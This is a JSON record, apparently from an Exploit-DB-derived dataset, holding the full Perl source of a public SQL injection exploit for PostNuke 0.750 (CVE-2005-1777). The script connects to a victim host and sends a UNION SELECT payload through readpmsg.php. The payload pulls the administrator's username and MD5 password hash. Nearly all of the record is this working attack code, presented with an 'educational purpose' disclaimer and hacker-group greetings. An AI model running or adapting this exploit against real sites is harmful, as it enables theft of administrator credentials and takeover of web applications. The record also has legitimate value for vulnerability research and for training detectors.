{
  "id": "1030",
  "title": "PostNuke 0.750 - &#039;readpmsg.php&#039; SQL Injection",
  "cve": "CVE-2005-1777",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n# This tools is only for educational purpose\r\n#\r\n# K-C0d3r a x0n3-h4ck friend !!!\r\n#\r\n# This exploit should give admin nick and md5 password\r\n#\r\n#-=[ PostNuke SQL Injection                     version : x=> 0.750]=-\r\n#-=[                                                               ]=-\r\n#-=[ Discovered by sp3x                                            ]=-\r\n#-=[ Coded by K-C0d3r                                              ]=-\r\n#-=[ irc.xoned.net #x0n3-h4ck to find me   K-c0d3r[at]x0n3-h4ck.org]=-\r\n#\r\n# Greetz to mZ, 2b TUBE, off, rikky, milw0rm, str0ke\r\n#\r\n# !!! NOW IS PUBLIC (6-6-2005) !!!\r\n\r\nuse IO::Socket;\r\n\r\nsub Usage {\r\nprint STDERR \"Usage: KCpnuke-xpl.pl <www.victim.com> </path/to/modules.php>\\n\";\r\nexit;\r\n}\r\n\r\nif (@ARGV < 2)\r\n{\r\n Usage();\r\n}\r\n\r\nif (@ARGV > 2)\r\n{\r\n Usage();\r\n}\r\n\r\nif (@ARGV == 2)\r\n{\r\n$host = @ARGV[0];\r\n$path = @ARGV[1];\r\n\r\nprint \"[K-C0d3r] PostNuke SQL Injection [x0n3-h4ck]\\n\";\r\nprint \"[+] Connecting to $host\\n\";\r\n\r\n$injection = \"$host\\/$path?\";\r\n$injection .= \"op=modload&name=Messages&file=readpmsg&start=0\";\r\n$injection .= \"%20UNION%20SELECT%20pn_uname,null,pn_uname,pn_pass,pn_pass,null,pn_pass,null\";\r\n$injection .= \"%20FROM%20pn_users%20WHERE%20pn_uid=2\\/*&total_messages=1\";\r\n\r\n$socket = new IO::Socket::INET (PeerAddr => \"$host\",\r\n                                PeerPort => 80,\r\n                                Proto => 'tcp');\r\n                                die unless $socket;\r\n\r\nprint \"[+] Injecting command ...\\n\";\r\nprint $socket \"GET http://$injection HTTP/1.1\\nHost: $host\\n\\n\";\r\nwhile (<$socket>)\r\n{\r\n print $_;\r\n exit;\r\n}\r\n}\r\n\r\n# milw0rm.com [2005-06-05]",
  "url": "https://www.exploit-db.com/exploits/1030"
}